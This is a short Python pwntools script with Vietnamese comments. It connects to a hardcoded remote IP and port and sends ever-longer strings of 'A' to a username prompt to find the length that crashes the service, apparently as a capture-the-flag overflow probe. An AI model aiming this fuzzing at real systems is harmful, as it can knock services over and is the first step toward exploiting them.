from pwn import *

# Tắt log chi tiết để dễ nhìn kết quả
context.log_level = 'error'

host = '34.40.133.67'
port = 4434

print("[+] Bắt đầu Fuzzing Username...")

# Thử tăng dần độ dài payload từ 100 đến 2000 byte
for i in range(100, 2000, 100):
    try:
        p = remote(host, port)
        p.recvuntil(b'username:')
        
        # Tạo payload toàn chữ 'A'
        payload = b'A' * i
        p.sendline(payload)
        
        # Chờ phản hồi
        response = p.recvall(timeout=2)
        
        if b'not found' in response:
            print(f"[-] {i} bytes: Sống sót")
        else:
            print(f"[!] BINGO! Chương trình đã crash ở {i} bytes!")
            break
            
        p.close()
    except EOFError:
        print(f"[!] BINGO! Chương trình đã crash (EOF) ở {i} bytes!")
        break